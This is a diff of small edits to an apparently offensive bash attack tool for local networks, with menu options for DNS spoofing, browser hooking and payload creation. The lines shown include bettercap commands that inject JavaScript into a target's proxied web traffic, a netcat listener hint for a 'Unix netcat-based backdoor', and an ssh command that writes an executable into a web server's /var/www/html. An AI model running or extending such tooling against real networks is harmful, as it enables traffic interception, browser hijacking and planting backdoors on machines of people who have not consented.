@@ -67,7 +67,7 @@ scan_targets() {
             if [[ $answer == *","* ]]; then
                 target_number=($(echo "$answer" | tr ',' '\n'))
                 for i in "${!target_number[@]}"; do
-                    if [[ "${array[@]}" =~ ${array[${target_number[$i]}]} ]]; then
+                    if [[ ${array[@]} =~ ${array[${target_number[$i]}]} ]]; then
                         target+="${array[${target_number[$i]}]}"
                         if (( i+1 < "${#target_number[@]}" )); then
                             target+=","
@@ -150,7 +150,7 @@ generate_payload() {
     local server_ip=""
     local port=""
     local options=("[${yellow}1${white}] Generate Windows payload."
-                   "[${yellow}2${white}] Generate Unix-based netcat backdoor.")
+                   "[${yellow}2${white}] Generate Unix netcat-based backdoor.")
     for i in "${options[@]}"; do echo -e "$i"; done
     read -p $'Select sub-option: \033[1m>\033[0m ' opt
     [[ $opt == "1" || $opt == "2" ]] && { [[ $opt == "1" ]] && win_payload=1 || win_payload=0; } || return 1
@@ -183,7 +183,7 @@ EOF
             echo -e "[${yellow}i${white}] Run 'nc -kl 4321'..."
             read -p "[${yellow}Y/n${white}] Wanna upload payload on the server? " answer
             if [[ ! $answer || $answer =~ ^[yY] ]]; then
-                read -p "Hostname to spawn reverse shell: " hostname
+                read -p "Hostname to upload Unix backdoor: " hostname
                 cat executable | ssh root@$hostname 'cd /var/www/html; cat > executable'
             fi
         else
@@ -233,11 +233,11 @@ launch_beef() {
     while [[ $flag ]]; do
         read -p "Enter js URL to continue with beef; js file absolute path or inline js code (within <script></script>) tags: " mode
         if [[ $mode == "/"* ]]; then
-            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-path "$mode" 2>/dev/null &
+            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-path "$mode" &>/dev/null &
         elif [[ $mode == "<script>"* ]]; then
-            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-data "$mode" 2>/dev/null &
+            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-data "$mode" &>/dev/null &
         elif [[ $mode =~ ([^:]+)://([^:/]+)(/.*) ]]; then
-            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-url "$mode" 2>/dev/null &
+            bettercap -T "$target" --proxy --proxy-https --proxy-module injectjs --js-url "$mode" &>/dev/null &
         else
             flag=1; echo -e "[${red}-${white}] Invalid mode."
         fi
@@ -246,6 +246,7 @@ launch_beef() {
 }
 
 (( EUID )) && abort "Run as root"
+hash ip 2>/dev/null || abort "Missing ip utility (brew install iproute2mac to install it)"
 printf "\033c"
 interface=$(ip route 2>/dev/null | grep "default" | awk '{print $5}')
 [[ ! $interface ]] && abort "No interfaces up"
@@ -263,7 +264,7 @@ done } && echo -e "[${green}+${white}] All OK." || echo -e "[${yellow}i${white}]
 localip=$(ifconfig "$interface" | egrep "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | awk '{print $2}')
 cidr_subnet=$(ip route show | awk '{print $3}' | sed -e 's/[0-9]\{1,3\}$/1\/24/;1q')
 
-eval printf '%.s=' {1.."$COLUMNS"}
+eval printf '%.s=' {1.."$(tput cols)"}
 options=("[${yellow}1${white}] DNS spoofing."
          "[${yellow}2${white}] Hook browser and/or inject js."
          "[${yellow}3${white}] Create payloads and/or upload it on the server."
